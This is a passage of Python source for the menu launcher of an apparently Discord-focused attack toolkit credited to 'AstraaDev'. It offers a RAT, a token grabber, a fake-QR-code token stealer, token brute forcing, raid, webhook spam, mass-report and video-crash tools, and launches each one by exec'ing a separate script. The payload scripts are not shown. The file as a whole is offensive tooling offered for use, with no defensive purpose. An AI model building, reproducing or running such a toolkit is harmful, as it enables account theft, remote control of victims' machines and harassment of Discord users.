    print(f"""                    {b}██{y}║  {b}██{y}║{b}██{y}║╚════{b}██{y}║{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}║  {b}██{y}║    {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║   {b}██{y}║   """)
    print(f"""                    {b}██████{y}╔╝{b}██{y}║{b}███████{y}║╚{b}██████{y}╗╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║{b}██████{y}╔╝    {b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║   {b}██{y}║   """)
    print(f"""                    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{w}ev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://astraadev.club/ {b}|{w} http://as""")
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n""")

def main():
    os.system('cls')
    astraahometitle()
    print(f"""        {y}[{b}+{y}]{w} Main Options:          {y}[{b}+{y}]{w} Token Options:          {y}[{b}+{y}]{w} Gen/Checker Options:      {y}[{b}+{y}]{w} Basic Options:\n""")
    print(f"""            {y}[{w}01{y}]{w} RAT Tool              {y}[{w}06{y}]{w} Token Grabber         {y}[{w}12{y}]{w} Nitro                     {y}[{w}14{y}]{w} HypeSquad Changer\n""")
    print(f"""            {y}[{w}02{y}]{w} Raid Tool             {y}[{w}07{y}]{w} FakeQrCode            {y}[{w}13{y}]{w} Token                     {y}[{w}15{y}]{w} Cycle Color Theme\n""")
    print(f"""            {y}[{w}03{y}]{w} VideoCrash Maker      {y}[{w}08{y}]{w} Token BrutForce                                      {y}[{w}16{y}]{w} WebHooks Remover\n""")
    print(f"""            {y}[{w}04{y}]{w} Massive Report        {y}[{w}09{y}]{w} Token Rape\n""")
    print(f"""            {y}[{w}05{y}]{w} WebHooks Spam         {y}[{w}10{y}]{w} Token Informations\n""")
    print(f"""                                       {y}[{w}11{y}]{w} AutoLogin\n\n                                                                                                         {y}[{b}>{y}]{w} Next Page""")
    global choice
    choice = input(f"""{y}[{b}#{y}]{w} Choice: """)

    if choice == '1' or choice == '01':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/1_Rat/rat.py').read())

    elif choice == '2' or choice == '02':
        os.system('cls')
        Spinner()
        os.system('cls')
        script_name = 'Additional_File/2_Raid/raid.py'
        cmd_line = [sys.executable, script_name]
        subprocess.check_call(cmd_line)

    elif choice == '3' or choice == '03':
        os.system('cls')
        Spinner()
        os.system('cls')
        subprocess.call([r'Additional_File\\3_VidCrashMaker\\crashvideomaker.bat'])

    elif choice == '4' or choice == '04':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/4_MassReport/massreport.py').read())

    elif choice == '5' or choice == '05':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/5_WebhookSpam/webhookspam.py').read())

    elif choice == '6' or choice == '06':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/6_TokenGrab/tokengrabber.py').read())

    elif choice == '7' or choice == '07':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/7_TokenFakeQr/fakeqr.py').read())
        
    elif choice == '8' or choice == '08':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/8_TokenBrutForce/brutforcetoken.py').read())
    
    elif choice == '9' or choice == '09':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/9_TokenRape/tokenrape.py').read())

    elif choice == '10':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/10_TokenInfo/tokeninfo.py').read())
        
    elif choice == '11':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/11_AutoLogin/autologin.py').read())

    elif choice == '12':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/12_NitroGen/nitrogen.py').read())

    elif choice == '13':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/13_TokenGen/tokengen.py').read())

    elif choice == '14':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/14_HypeSquadChanger/hypesquadchanger.py').read())
        
    elif choice == '15':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/15_CycleColorTheme/cyclecolortheme.py').read())
            
    elif choice == '16':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/16_WebHooksRemover/webhooksremover.py').read())
    
    elif choice == '>':
        os.system('cls')
        astraahometitle()
        print(f"""        {y}[{b}+{y}]{w} Other Options:\n""")
        print(f"""            {y}[{w}17{y}]{w} Credits\n""")
        print(f"""            {y}[{w}18{y}]{w} Exit\n\n\n\n\n\n\n\n\n\n                                                                                                     {y}[{b}<{y}]{w} Previous Page""")
        choice = input(f"""{y}[{b}#{y}]{w} Choice: """)

        if choice == '17':
            os.system('cls')
            Spinner()
            os.system('cls')
            astraahometitle()
            print(f"""                                            {y}[{b}+{y}]{w} Development Networks:\n""")
            print(f"""                                                {y}[{w}#{y}]{w} GitHub:    @AstraaDev""")
            print(f"""                                                {y}[{w}#{y}]{w} WebSite:   astraadev.club""")
            print(f"""                                                {y}[{w}#{y}]{w} Server:    discord.gg/pUZrFnabvd\n\n""")
            print(f"""                                            {y}[{b}+{y}]{w} Other Networks:\n""")
            print(f"""                                                {y}[{w}#{y}]{w} Twitter:   @AstraaDev""")
            print(f"""                                                {y}[{w}#{y}]{w} Discord:   Astraa#4589""")
            print(f"""                                                {y}[{w}#{y}]{w} Insta:     @astraaftn\n\n\n""")
            input(f"""{y}[{w}#{y}]{w} Press ENTER to exit""")
            sys.exit()
        elif choice == '18':
            os.system('cls')
            Spinner()
            os.system('cls')
            astraahometitle()
            print(f"""                                                {y}[{b}❤{y}]{w} Have a good day :)""")
            print(f"""{Fore.LIGHTRED_EX }
                                                  ,ad8PPPP88b,     ,d88PPPP8ba,
                                                 d8P"      "Y8b, ,d8P"      "Y8b
                                                dP'           "8a8"           `Yd
                                                8(              "              )8
                                                I8                             8I
                                                 Yb,                         ,dP
                                                  "8a,                     ,a8"
                                                    "8a,                 ,a8"
                                                      "Yba             adP"
                                                        `Y8a         a8P'
                                                          `88,     ,88'
                                                            "8b   d8"
                                                             "8b d8"
                                                              `888'""")
            time.sleep(3)
            sys.exit()
        elif choice == '<':
            os.system('cls')
            main()    
        else:
            os.system('cls')
            main()
    else:
        os.system('cls')
        main()

main()